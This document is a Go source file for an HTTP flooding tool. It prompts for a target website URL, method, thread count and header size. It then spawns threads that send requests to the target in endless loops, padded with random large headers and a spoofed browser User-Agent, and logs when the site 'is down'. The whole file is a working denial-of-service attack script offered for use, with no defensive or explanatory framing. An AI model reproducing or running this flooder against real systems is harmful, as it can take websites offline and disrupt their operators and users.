package main

import (
	"fmt"
	"log"
	"math/rand"
	"net/http"
)

func main() {

	var URL string
	var Method string
	var Threads int
	var HPR int
	var HeaderSizeChar int

	var SHOWONLYDOWN string
	SHOWONLYDOWN = "N"

	var confirmed string
	confirmed = "Y"

	fmt.Print("Website URL <STRING> - ")
	fmt.Scanln(&URL)
	fmt.Print("Method <STRING> - ")
	fmt.Scanln(&Method)
	fmt.Print("Threads <INT> - ")
	fmt.Scanln(&Threads)
	fmt.Print("Headers per request <INT> - ")
	fmt.Scanln(&HPR)
	fmt.Print("Header size (random ascii char) <INT> - ")
	fmt.Scanln(&HeaderSizeChar)
	fmt.Print("Show Only Down <string> [y/N] - ")
	fmt.Scanln(&SHOWONLYDOWN)
	fmt.Print("\n\n\n==================================================\n")
	fmt.Println("URL              = " + URL)
	fmt.Println("Method           = " + Method)
	fmt.Printf("Threads          = %d \n", Threads)
	fmt.Printf("HPR              = %d \n", HPR)
	fmt.Printf("Header size      = %d \n\n", +HeaderSizeChar)
	fmt.Println("Log only down     = " + SHOWONLYDOWN)
	fmt.Print("================================================== \n")
	fmt.Printf("confirm [Y/n] -> ")
	fmt.Scanln(&confirmed)
	var i int

	if confirmed == "y" || confirmed == "Y" {
		for i = 0; i < Threads; i++ {
			go SpamThread(URL, Method, HeaderSizeChar, HPR, SHOWONLYDOWN)
		}
	}

	for {

	}
}

func SpamThread(URL string, Method string, HeaderSize int, HPR int, OnlyDown string) {

	req, err := http.NewRequest(Method, URL, nil)

	if err != nil {
		fmt.Println(err.Error())
	}

	req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	var i int
	for i = 0; i < HPR; i++ {
		req.Header.Add(RandStringRunes(25), RandStringRunes(HeaderSize))
	}

	for {
		client := &http.Client{}
		resp, err := client.Do(req)

		if err != nil {
			log.Println(err.Error())
		}

		if resp.StatusCode == 200 {
			if OnlyDown == "n" || OnlyDown == "N" {
				log.Println("[ " + URL + " ]- OK")
			}
		} else {
			log.Println("[ " + URL + " ] - is down")
		}
	}
}
func RandStringRunes(n int) string {
	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}